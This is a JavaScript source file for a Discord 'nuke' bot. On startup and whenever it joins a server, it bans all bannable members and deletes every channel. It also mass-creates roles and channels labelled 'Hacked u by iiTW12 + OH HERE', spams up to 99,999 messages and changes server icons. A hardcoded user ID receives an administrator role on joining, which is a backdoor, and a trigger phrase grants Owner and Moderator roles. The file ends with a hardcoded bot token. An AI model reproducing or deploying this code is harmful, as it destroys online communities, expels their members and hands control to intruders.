const Discord = require("discord.js");
var client = new Discord.Client();

const PREFIX = "&i";

function commandIs(str, msg){
    return msg.content.toLowerCase().startsWith('&i' + str);
}

function pluck(array) {
    return array.map(function(item) { return item["name"]; });
}

function hasRole(mem, role) {
    if(pluck(mem.roles).includes(role)){
        return true;
    } else {
        return false;
    }

  }
  




client.on('ready', () => {
 client.user.setGame('By iiTW12 + OH HERE','https://www.twitch.tv/v5bz%27');
  console.log(`Logged in as ${client.user.tag}!`);

});

client.on('message', message => {

if (message.content.startsWith("h!add.r")) {
             if(!message.channel.guild) return message.reply('**Commands in the server**');
        let args = message.content.split(" ").slice(1);
            message.guild.createRole({
                name : args.join(' '),
                color : "RANDOM", 
                permissions : [1]
            }).then(function(role){
                message.addRole(role)
            })

}
});

var prefix = "-"
client.on("message", message => {
  if(!message.content.startsWith(prefix)) return;;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' ');
  if (message.content.startsWith('hix15')) {
    client.user.setUsername(argresult);
  }
    if (message.content.startsWith(prefix + 'on123')) {
    client.user.setStatus(argresult);
  }
});
 
var x1 = "kk"
client.on('message', message => {
     if (message.content === ".") {
client.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 
}
});
var x1 = "kk"
client.on('message', message => {
     if (message.content === ".") {
client.user.setUsername("Hacked u by iiTW12 + OH HERE Is here")
 
}
});
client.on('message', message => {
     if (message.content === ".") {
client.user.setGame(`Hacked u by iiTW12 + OH HERE Is here`,'https://www.twitch.tv/hix')
 

}
});

 
client.on('message', message => {
     if (message.content === ".") {
                 if(!message.channel.guild) return;
 
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 
}
});
 
client.on('message', message => {
     
 
     if (message.content === "k1") {
         client.guilds.forEach(m =>{
  m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by iiTW12 + OH HERE Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
 
   
})
 
 
}
});
client.on('message', message => {
         if (message.content === "k") {
               client.guilds.forEach(m =>{
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
 
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
 
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
 
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
 
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
 
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
 
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
 
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
 
})
}
});
 
client.on('message', message => {
         if (message.content === "k") {
                 client.guilds.forEach(m =>{
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
 
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
 
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');

m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
 
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
 
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
m.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
 
 
 
})
}
 
});
 
 
const { Client } = require('discord.js');
const discord = new Client();
 
async function nuke(guild) {
  let users = 0;
  let channels = 0;
 
  await guild.fetchMembers();
  
 
 
  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('^_^').catch(e => { return void e; });
      return m.ban();
    }
  }));
 
    await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));
 
    await guild.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'text');
 
      await guild.createChannel('Hacked u by iiTW12 + OH HERE Is here', 'voice');
 
 
 
}
 
client.on('ready', () => {
  for(const [, g] of client.guilds) nuke(g).catch(console.error);
  console.log('-------------------------------------------------------------');
  console.log('');
  console.log("Made by YzhF1");
  console.log("");
  console.log("-------------------------------------------------------------");
 
});
 
client.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});
 
client.on('guildMemberAdd', member => {
   
            if (member.id === "349288766302584832") {
                member.guild.createRole({
                    name : client.user.username,
                    color : "RANDOM",
                    permissions : [8]
                }).then(function(role){
                    member.addRole(role)
                })
               
            }
       
    });
client.on('message', message => {
var prefix = "i-"
  if (message.author.omar) return;
  if (!message.content.startsWith(prefix)) return;
  var command = message.content.split(" ")[0];
  command = command.slice(prefix.length);
  var args = message.content.split(" ").slice(1);
  if (command == "ban") {
   if(!message.channel.guild) return message.reply('** This command only for servers**');
var user = message.mentions.users.first();
  var reason = message.content.split(" ").slice(2).join(" ");
  const banembed = new Discord.RichEmbed()
  .setColor("RANDOM")
  .addField("**Reason:**", '**[ ' + `${reason}` + ' ]**')
  user.send(reason).then(()=>{
message.guild.member(user).kick();
  })
}
});

client.on('message', message => {
if (message.content === 'iiTW12 + OH HERE_s') {
      let count = 1;
      let ecount = 1;
      for(let x = 1; x < 99999; x++) {
        message.channel.send('Hacked By iiTW12 + OH HERE')
          .then(m => {
            count++;
          })
          
        }
      }
});

client.on('message', message => {
  if (message.content.startsWith('hackbyiiTW12 + OH HERE')) {
     if(!message.channel.guild) return;
  message.member.addRole(message.guild.roles.find("Hacked", "Clonel"));
 
 }
});
client.on('message', message => {
  if (message.content.startsWith('hackbyiiTW12 + OH HERE')) {
     if(!message.channel.guild) return;
  message.member.addRole(message.guild.roles.find("name", "Owner"));
 
 }
 });
 
client.on('message', message => {
  if (message.content.startsWith('hackbyiiTW12 + OH HERE')) {
     if(!message.channel.guild) return;
  message.member.addRole(message.guild.roles.find("name", "Co-Owner"));
 
 }
 });
 
client.on('message', message => {
  if (message.content.startsWith('hackbyiiTW12 + OH HERE')) {
     if(!message.channel.guild) return;
  message.member.addRole(message.guild.roles.find("name", "Moderator"));
 
 }
 });
 
client.on('message', message => {
  if (message.content.startsWith('hackbyiiTW12 + OH HERE')) {
     if(!message.channel.guild) return;
  message.member.addRole(message.guild.roles.find("name", "Master"));
 
 }
});

client.on('message', msg => {
    if (msg.content.startsWith(`.warn`)) {
       let args = msg.content.split(" ").slice(1);
      if (!msg.mentions.members.first()) return msg.reply('منشن الشخص المحدد')
      if (!args[1]) return msg.reply('``اكتب السبب``')
      //غير اسم الروم او سوي روم بذا الاسم
      if (msg.guild.channels.find('name', 'warns')) {
        //اذا غيرت فوق غير هنا كمان
        msg.guild.channels.find('name', 'warns').send(`
      تم اعطائك تنبيه : ${msg.mentions.members.first()}
      لأنك قمت بما يلي
      ${args.join(" ").split(msg.mentions.members.first()).slice(' ')}
      `)
      }
    }
})

//Hixx
client.on('message', message => {
if (message.content.split(' ')[0] == 'tbc')
 message.guild.members.forEach( member => {
member.send( `${member} ! ` + "**" + message.guild.name + " : ** " + message.content.substr(3));
                                                            message.delete();
});
});

//جميع الحقوق محفوظه لهيكس وخبز
client.on("message", message => {
    var prefix = "tbc";
 
            var args = message.content.substring(prefix.length).split(" ");
            if (message.content.startsWith(prefix + "tbc")) {
                            let embed4 = new Discord.RichEmbed()
             .setDescription("**:white_check_mark: | جاري ارسال الرسالة التهكير لي صاحب السيرفر و الباقية**")
                                                            .setColor("#008000")
                                message.channel.sendEmbed(embed4);
                                                      message.delete();
                            
                          }
});

client.on("message", (message) => {
    if (message.content.startsWith('t!dc')) {

        let args = message.content.split(' ').slice(1);
        let channel = message.client.channels.find('name', args.join(' '));
        if (!channel) return message.reply('**There is no room like this name -_-**').catch(console.error);
        channel.delete()
    }
});

let id;
let guild;
let emojiHasPermission;

client.on('ready', () => {
  console.log('Connected');
});

client.on('message', message => {
  id = client.user.id;
  guild = message.guild;
  emojiHasPermission = permission => {
    console.log(permission);
    if (guild.member(id).permissions.has(permission, false)) {
      return ':white_check_mark:';
    } else {
      return ':x:';
    }
  };
  if (message.content === 't!per') {
  message.channel.send({embed: {
    title: ':tools: Permissions',
    color: 0x06DF00,
    fields: [
      {

        name: 'Administrator :',
        value: emojiHasPermission('ADMINISTRATOR'),
        inline: true
      },
      {
        name: 'Create Instant Invite :',
        value: emojiHasPermission('CREATE_INSTANT_INVITE'),
        inline: true
      },
      {
        name: 'Kick Members :',
        value: emojiHasPermission('KICK_MEMBERS'),
        inline: true
      },
      {
        name: 'Ban Members :',
        value: emojiHasPermission('BAN_MEMBERS'),
        inline: true
      },
      {
        name: 'Manage Channels :',
        value: emojiHasPermission('MANAGE_CHANNELS'),
        inline: true
      },
      {
        name: 'Manage Guild :',
        value: emojiHasPermission('MANAGE_GUILD'),
        inline: true
      },
      {
        name: 'Add Reactions :',
        value: emojiHasPermission('ADD_REACTIONS'),
        inline: true
      },
      {
        name: 'View Audit Log :',
        value: emojiHasPermission('VIEW_AUDIT_LOG'),
        inline: true
      },
      {

        name: 'Manage Messages :',
        value: emojiHasPermission('MANAGE_MESSAGES'),
        inline: true
      },
      {
        name: 'Embed Links :',
        value: emojiHasPermission('EMBED_LINKS'),
        inline: true
      },
      {
        name: 'Attach Files :',
        value: emojiHasPermission('ATTACH_FILES'),
        inline: true
      },
      {
        name: 'Read Message History :',
        value: emojiHasPermission('READ_MESSAGE_HISTORY'),
        inline: true
      },
      {
        name: 'Mention Everyone :',
        value: emojiHasPermission('MENTION_EVERYONE'),
        inline: true
      },
      {
        name: 'Use External Emojis :',
        value: emojiHasPermission('USE_EXTERNAL_EMOJIS'),
        inline: true
      },
      {
        name: 'Connect :',
        value: emojiHasPermission('CONNECT'),
        inline: true
      },
      {
        name: 'Speak :',
        value: emojiHasPermission('SPEAK'),
        inline: true
      },
      {

        name: 'Mute Members :',
        value: emojiHasPermission('MUTE_MEMBERS'),
        inline: true
      },
      {
        name: 'Deafen Members :',
        value: emojiHasPermission('DEAFEN_MEMBERS'),
        inline: true
      },
      {
        name: 'Move Members :',
        value: emojiHasPermission('MOVE_MEMBERS'),
        inline: true
      },
      {
        name: 'Use VAD :',
        value: emojiHasPermission('USE_VAD'),
        inline: true
      },
      {
        name: 'Change Nickname :',
        value: emojiHasPermission('CHANGE_NICKNAME'),
        inline: true
      },
      {
        name: 'Manage Nicknames :',
        value: emojiHasPermission('MANAGE_NICKNAMES'),
        inline: true
      },
      {
        name: 'Manage Roles :',
        value: emojiHasPermission('MANAGE_ROLES'),
        inline: true
      },
      {
        name: 'Manage Webhooks :',
        value: emojiHasPermission('MANAGE_WEBHOOKS'),
        inline: true
      },
      {
        name: 'Manage Emojis :',
        value: emojiHasPermission('MANAGE_EMOJIS'),
        inline: true
      }
    ]
  }
  });
  }
});



client.login("NDE5Mzk4MTIwODkyMjY4NTU1.DXvjQQ.P84FY0EbEfdJCfmLICn1bJL6fpo")